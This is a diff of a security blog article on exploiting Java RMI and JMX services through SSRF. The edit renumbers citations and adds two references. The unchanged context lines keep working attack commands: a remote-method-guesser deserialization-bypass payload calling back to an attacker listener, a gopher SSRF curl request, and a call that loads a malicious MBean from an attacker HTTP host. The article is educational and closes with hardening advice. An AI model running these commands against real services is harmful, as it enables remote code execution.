@@ -48,7 +48,7 @@ for attackers. Over the last couple of years, the security of *Java RMI*
 has vastly improved, but vulnerable endpoints are still encountered quite
 frequently. Moreover, even a fully patched *RMI* service can yield as an
 entry point for attackers when the available *remote objects* expose dangerous
-functions.
+methods [\[1\]](#references).
 
 If you ever implemented something using *Java RMI*, you probably
 doubt that the protocol can be targeted by *SSRF* attacks. For those who
@@ -146,7 +146,7 @@ Another problem we have not talked about so far are data types. It should be obv
 *SSRF* vulnerability cannot be utilized to perform *SSRF* attacks on *RMI* services. Already the first few bytes
 (the *RMI magic*) would cause an corrupted stream and lead to an error on the *RMI* service. Instead, you need to be
 able to send arbitrary bytes to the target *RMI service*. Especially null bytes need
-to be allowed, which causes problems even with *gopher* based *SSRF* attacks on newer curl versions [\[1\]](#references).
+to be allowed, which causes problems even with *gopher* based *SSRF* attacks on newer curl versions [\[2\]](#references).
 However, when this condition is met and you can send arbitrary data to the *RMI* service, you can dispatch
 calls as with a direct connection.
 
@@ -185,7 +185,7 @@ public boolean isReusable()
 
 This makes it difficult to modify the protocol type, even when using reflection.
 
-In the following chapters, we use *remote-method-guesser* [\[2\]](#references) to generate *SSRF* payloads. Despite the tool
+In the following chapters, we use *remote-method-guesser* [\[3\]](#references) to generate *SSRF* payloads. Despite the tool
 is written in *Java* and consumes the default *Java RMI* implementation, it uses a custom socket factory to convert *SSRF* payloads
 from *Stream* to *Single Operation Protocol*. This is the default behavior that is used within the following examples, but you can
 also generate *Stream Protocol* payloads using the ``--stream-protocol`` option.
@@ -228,8 +228,8 @@ rare, but when all conditions are satisfied, you can consume any *RMI* service a
 
 To demonstrate the *SSRFibility* of the *Java RMI* protocol, we will now attack an *RMI registry* endpoint using a
 webapplication that is vulnerable to *SSRF* attacks. In order to make this as comfortable as possible, we use *remote-method-guesser*
-[\[2\]](#references), a *Java RMI* vulnerability scanner with integrated *SSRF* support.
-The *remote-method-guesser* repository also contains an *SSRF* example server [\[3\]](#references)
+[\[3\]](#references), a *Java RMI* vulnerability scanner with integrated *SSRF* support.
+The *remote-method-guesser* repository also contains an *SSRF* example server [\[4\]](#references)
 that we can use for demonstration purposes. The setup for the following demonstration looks like this:
 
 * *HTTP* service vulnerable to *SSRF* within the ``url`` parameter on ``http://172.17.0.2:8000``
@@ -284,8 +284,8 @@ Ncat: Listening on 0.0.0.0:4445
 Now we create the *SSRF* payload. Creating *SSRF* payloads with *remote-method-guesser* is quite simple. Almost
 each operation supports the ``--ssrf`` option. With this option set, instead of performing the requested operation
 on a remote server, a corresponding *SSRF* payload is generated. For our purpose we need to target the *RMI registry*
-on the remote server which listens on ``localhost:1090``. Furthermore, we use the ``AnTrinh`` payload, which is the
-most recent deserialization filter bypass:
+on the remote server which listens on ``localhost:1090``. Furthermore, we use the ``AnTrinh`` payload
+[\[5\]](#references), which is the most recent deserialization filter bypass for the *RMI registry*:
 
 ```console
 $ rmg serial 127.0.0.1 1090 AnTrinh 172.17.0.1:4444 --component reg --ssrf --gopher --encode
@@ -332,7 +332,7 @@ shows all of the above mentioned steps in action:
 
 ## Attacking Custom RMI Services
 
-The ssrf-server [\[3\]](#references) from the *remote-method-guesser* repository runs one custom *RMI service* that is,
+The ssrf-server [\[4\]](#references) from the *remote-method-guesser* repository runs one custom *RMI service* that is,
 like the *RMI registry*, only reachable from localhost.  The corresponding service implements the ``IFileManager``
 interface with the following method signatures:
 
@@ -519,7 +519,7 @@ $ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf-response
 
 Now we know that the *remote object* listens on ``localhost:39177`` with an ``ObjID`` value of ``[-105b46fa:17dffd99820:-7ffe, -4107030835313135004]``.
 This information is sufficient to call the ``newClient`` method on the *remote object*. We expect the *JMX* service to allow unauthenticated connections
-and pass ``null`` for the required *credential* argument. Furthermore, we can use the *GenericPrint plugin* [\[4\]](#references)
+and pass ``null`` for the required *credential* argument. Furthermore, we can use the *GenericPrint plugin* [\[6\]](#references)
 of *remote-method-guesser* to parse the return value of the ``newCall`` method:
 
 ```console
@@ -546,7 +546,7 @@ $ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2Flocalhost%3A39177%2F_%254a%255
 ```
 
 Afterwards, we can use the *MLet MBean* to load a malicious *MBean* using the ``getMBeansFromURL`` method. To create the required payload and the *HTTP* listener,
-we use *beanshooter* [\[5\]](#references) with it's ``--stager-only`` option:
+we use *beanshooter* [\[7\]](#references) with it's ``--stager-only`` option:
 
 ```console
 $ rmg call localhost 39177 'new javax.management.ObjectName("DefaultDomain:type=MLet"), "getMBeansFromURL", new java.rmi.MarshalledObject(new Object[] {"http://172.17.0.1:8000/mlet"}), new String[] { String.class.getName() }, null' --signature 'Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)' --objid '[-105b46fa:17dffd99820:-7ff9, -6186794315107745404]' --ssrf --gopher --encode
@@ -642,22 +642,22 @@ rmg call localhost ${JMX_PORT} "${ARG_EXEC}" --signature "${SIG_INVOKE}" --objid
 
 ----
 
-Preventing *Server Side Request Forgery* is a topic on it's own and several useful resources are available [\[6\]\[7\]\[8\]](#references).
+Preventing *Server Side Request Forgery* is a topic on it's own and several useful resources are available [\[8\]\[9\]\[10\]](#references).
 However, the attack types discussed in this article demonstrate why it is so important to secure backend services as well. With only a
 few configuration changes, none of the above discussed attacks would have worked. Here are some recommendations for securing *RMI services*:
 
 1. Make sure you use an up to date version of *Java*. The security level of *Java RMI* is constantly improving and outdated
    *Java* versions often contain known vulnerabilities. If you are not able to update, you should at least evaluate your current
    security level by looking for known vulnerabilities for your installed *Java* version and usage of vulnerability scanners like
-   *remote-method-guesser* [\[2\]](#references). Depending on the installed version of *Java*, workarounds may be possible.
+   *remote-method-guesser* [\[3\]](#references). Depending on the installed version of *Java*, workarounds may be possible.
 2. Enable *TLS* protected communication for all *RMI* endpoints. Despite *Java RMI* sends mostly binary data that does not look readable,
    it is actually a plain text protocol. All information passed to and received from an *RMI* service is sent in plain text and
    can be read and modified by an attacker with a suitable position inside the network. If possible, you should also consider enabling
    certificate based authentication for your *RMI* services.
 3. Implement authentication for your *RMI* services. All *remote objects* that perform sensitive operations should require users
    to authenticate before they can be used. Especially *JMX* services should be password protected and use the *role* model of
-   *JMX* to only grant the required amount of privileges to authenticated users [\[9\]](#referneces).
-4. Make use of deserialization filters for your *RMI* services and only allow required types to be deserialized [\[10\]](#referneces).
+   *JMX* to only grant the required amount of privileges to authenticated users [\[11\]](#referneces).
+4. Make use of deserialization filters for your *RMI* services and only allow required types to be deserialized [\[12\]](#referneces).
    Also make sure that your applications and third party libraries do not contain classes that perform dangerous actions during
    deserialization.
 
@@ -681,13 +681,15 @@ using the *SSRF* vulnerability. If you ever encounter such a service, I would lo
 
 ----
 
-* \[1\] [Exploiting Tiny Tiny RSS](https://www.digeex.de/blog/tinytinyrss/)
-* \[2\] [remote-method-guesser (GitHub)](https://github.com/qtc-de/remote-method-guesser)
-* \[3\] [ssrf-example-server (GitHub)](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
-* \[4\] [GenericPrint rmg Plugin (GitHub)](https://github.com/qtc-de/remote-method-guesser/tree/master/plugins)
-* \[5\] [beanshooter](https://github.com/qtc-de/beanshooter)
-* \[6\] [Server-Side Request Forgery Prevention Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
-* \[7\] [Server-side request forgery (PortSwigger)](https://portswigger.net/web-security/ssrf)
-* \[8\] [What is server-side request forgery (Acunetix)](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
-* \[9\] [Monitoring and Management Using JMX Technology (Oracle)](https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html)
-* \[10\] [Serialization Filtering (Oracle)](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm)
+* \[1\] [Attacking Java RMI services after JEP 290](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
+* \[2\] [Exploiting Tiny Tiny RSS](https://www.digeex.de/blog/tinytinyrss/)
+* \[3\] [remote-method-guesser (GitHub)](https://github.com/qtc-de/remote-method-guesser)
+* \[4\] [ssrf-example-server (GitHub)](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
+* \[5\] [An Trinhs RMI Registry Bypass](https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/)
+* \[6\] [GenericPrint rmg Plugin (GitHub)](https://github.com/qtc-de/remote-method-guesser/tree/master/plugins)
+* \[7\] [beanshooter](https://github.com/qtc-de/beanshooter)
+* \[8\] [Server-Side Request Forgery Prevention Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+* \[9\] [Server-side request forgery (PortSwigger)](https://portswigger.net/web-security/ssrf)
+* \[10\] [What is server-side request forgery (Acunetix)](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
+* \[11\] [Monitoring and Management Using JMX Technology (Oracle)](https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html)
+* \[12\] [Serialization Filtering (Oracle)](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm)
